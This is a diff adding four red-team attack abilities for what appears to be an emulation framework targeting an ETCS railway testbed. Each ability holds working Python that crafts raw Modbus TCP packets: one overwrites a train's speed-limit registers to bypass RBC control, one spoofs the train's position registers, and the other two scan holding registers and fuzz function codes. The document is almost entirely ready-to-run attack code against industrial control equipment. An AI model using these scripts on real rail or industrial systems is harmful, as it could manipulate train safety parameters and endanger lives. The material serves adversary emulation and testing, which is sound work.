@@ -1,0 +1,248 @@
+---
+id: 6f7g8h9i-0j1k-2l3m-4n5o-6p7q8r9s0t1u
+name: Modbus Register Write - Speed Limit Override
+description: Directly write to Modbus speed_limit registers to bypass RBC control
+tactic: impact
+technique:
+  attack_id: T0836
+  name: Modify Parameter
+platforms:
+  linux:
+    sh:
+      command: |
+        python3 << 'EOF'
+        import socket
+        import struct
+        import time
+
+        target_host = "#{etcs.modbus_host}"
+        target_port = #{etcs.modbus_port}
+        slave_id = #{etcs.modbus_slave_id}
+        speed_limit = #{etcs.speed_limit}
+
+        # Encode speed limit as 32-bit float
+        speed_bytes = struct.pack(">f", float(speed_limit))
+        reg1, reg2 = struct.unpack(">HH", speed_bytes)
+
+        # Build Modbus TCP request (Function Code 16: Write Multiple Registers)
+        transaction_id = int(time.time() * 1000) % 65536
+        protocol_id = 0
+        mbap = struct.pack(">HHHBB", transaction_id, protocol_id, 11, slave_id, 16)
+        pdu = struct.pack(">HHB", 4, 2, 4)  # Start reg 4, count 2, 4 bytes
+        pdu += struct.pack(">HH", reg1, reg2)
+        
+        request = mbap + pdu
+
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(2.0)
+            s.connect((target_host, target_port))
+            s.sendall(request)
+            response = s.recv(1024)
+            s.close()
+            
+            if len(response) >= 9 and response[7] == 16:
+                print(f"[SUCCESS] Wrote speed_limit={speed_limit} km/h to registers 4-5")
+            else:
+                print(f"[FAILED] Invalid response: {response.hex()}")
+        except Exception as e:
+            print(f"[FAILED] {e}")
+        EOF
+      parsers:
+        plugins.etcs_testbed.app.parsers.etcs_result:
+          - source: etcs.modbus_write_result
+      cleanup: []
+      payloads: []
+requirements:
+  - plugins.etcs_testbed.app.requirements.etcs_modbus_reachable:
+      - source: etcs.modbus_host
+      - source: etcs.modbus_port
+access:
+  - red
+---
+id: 7g8h9i0j-1k2l-3m4n-5o6p-7q8r9s0t1u2v
+name: Modbus Register Scan
+description: Scan Modbus holding registers to discover accessible data and system state
+tactic: discovery
+technique:
+  attack_id: T0840
+  name: Network Connection Enumeration
+platforms:
+  linux:
+    sh:
+      command: |
+        python3 << 'EOF'
+        import socket
+        import struct
+        import time
+
+        target_host = "#{etcs.modbus_host}"
+        target_port = #{etcs.modbus_port}
+        slave_id = #{etcs.modbus_slave_id}
+        start_reg = #{etcs.start_register}
+        count = #{etcs.register_count}
+
+        transaction_id = int(time.time() * 1000) % 65536
+        protocol_id = 0
+        
+        # Function Code 3: Read Holding Registers
+        mbap = struct.pack(">HHHBB", transaction_id, protocol_id, 6, slave_id, 3)
+        pdu = struct.pack(">HH", start_reg, count)
+        request = mbap + pdu
+
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(2.0)
+            s.connect((target_host, target_port))
+            s.sendall(request)
+            response = s.recv(4096)
+            s.close()
+            
+            if len(response) >= 9:
+                byte_count = response[8]
+                data = response[9:9 + byte_count]
+                values = struct.unpack(f">{byte_count // 2}H", data)
+                
+                print(f"[SUCCESS] Read {len(values)} registers starting at {start_reg}")
+                for i, val in enumerate(values):
+                    print(f"  Register {start_reg + i}: 0x{val:04X} ({val})")
+            else:
+                print(f"[FAILED] Invalid response")
+        except Exception as e:
+            print(f"[FAILED] {e}")
+        EOF
+      parsers:
+        plugins.etcs_testbed.app.parsers.etcs_modbus_registers:
+          - source: etcs.modbus_registers
+      cleanup: []
+      payloads: []
+requirements:
+  - plugins.etcs_testbed.app.requirements.etcs_modbus_reachable:
+      - source: etcs.modbus_host
+      - source: etcs.modbus_port
+access:
+  - red
+---
+id: 8h9i0j1k-2l3m-4n5o-6p7q-8r9s0t1u2v3w
+name: Modbus Function Code Fuzzing
+description: Test Modbus function codes to discover supported operations
+tactic: discovery
+technique:
+  attack_id: T1046
+  name: Network Service Scanning
+platforms:
+  linux:
+    sh:
+      command: |
+        python3 << 'EOF'
+        import socket
+        import struct
+
+        target_host = "#{etcs.modbus_host}"
+        target_port = #{etcs.modbus_port}
+        slave_id = #{etcs.modbus_slave_id}
+
+        results = {}
+        
+        for func_code in range(1, 21):
+            try:
+                transaction_id = func_code
+                protocol_id = 0
+                mbap = struct.pack(">HHHBB", transaction_id, protocol_id, 2, slave_id, func_code)
+                
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(0.5)
+                s.connect((target_host, target_port))
+                s.sendall(mbap)
+                response = s.recv(1024)
+                s.close()
+                
+                if len(response) >= 8:
+                    resp_func = response[7]
+                    if resp_func == func_code:
+                        results[func_code] = "ACCEPTED"
+                    elif resp_func == (func_code | 0x80):
+                        results[func_code] = f"EXCEPTION_{response[8] if len(response) > 8 else 0}"
+                    else:
+                        results[func_code] = "UNKNOWN"
+                else:
+                    results[func_code] = "NO_RESPONSE"
+            except:
+                results[func_code] = "TIMEOUT"
+
+        print(f"[SUCCESS] Fuzzing complete:")
+        for code, status in results.items():
+            print(f"  FC {code:02d}: {status}")
+        EOF
+      parsers:
+        plugins.etcs_testbed.app.parsers.etcs_modbus_fuzzing:
+          - source: etcs.supported_functions
+      cleanup: []
+      payloads: []
+requirements:
+  - plugins.etcs_testbed.app.requirements.etcs_modbus_reachable:
+      - source: etcs.modbus_host
+      - source: etcs.modbus_port
+access:
+  - red
+---
+id: 9i0j1k2l-3m4n-5o6p-7q8r-9s0t1u2v3w4x
+name: Modbus Position Spoofing
+description: Manipulate train position registers to confuse RBC
+tactic: impact
+technique:
+  attack_id: T0836
+  name: Modify Parameter
+platforms:
+  linux:
+    sh:
+      command: |
+        python3 << 'EOF'
+        import socket
+        import struct
+        import time
+
+        target_host = "#{etcs.modbus_host}"
+        target_port = #{etcs.modbus_port}
+        slave_id = #{etcs.modbus_slave_id}
+        position_km = #{etcs.position_km}
+
+        # Encode position as 32-bit float
+        pos_bytes = struct.pack(">f", float(position_km))
+        reg1, reg2 = struct.unpack(">HH", pos_bytes)
+
+        # Write to registers 0-1 (position_km)
+        transaction_id = int(time.time() * 1000) % 65536
+        protocol_id = 0
+        mbap = struct.pack(">HHHBB", transaction_id, protocol_id, 11, slave_id, 16)
+        pdu = struct.pack(">HHB", 0, 2, 4)
+        pdu += struct.pack(">HH", reg1, reg2)
+        
+        request = mbap + pdu
+
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(2.0)
+            s.connect((target_host, target_port))
+            s.sendall(request)
+            response = s.recv(1024)
+            s.close()
+            
+            if len(response) >= 9 and response[7] == 16:
+                print(f"[SUCCESS] Spoofed position_km={position_km} km")
+            else:
+                print(f"[FAILED] Invalid response")
+        except Exception as e:
+            print(f"[FAILED] {e}")
+        EOF
+      parsers:
+        plugins.etcs_testbed.app.parsers.etcs_result:
+          - source: etcs.modbus_write_result
+      cleanup: []
+      payloads: []
+requirements:
+  - plugins.etcs_testbed.app.requirements.etcs_modbus_reachable:
+      - source: etcs.modbus_host
+      - source: etcs.modbus_port
+access:
+  - red
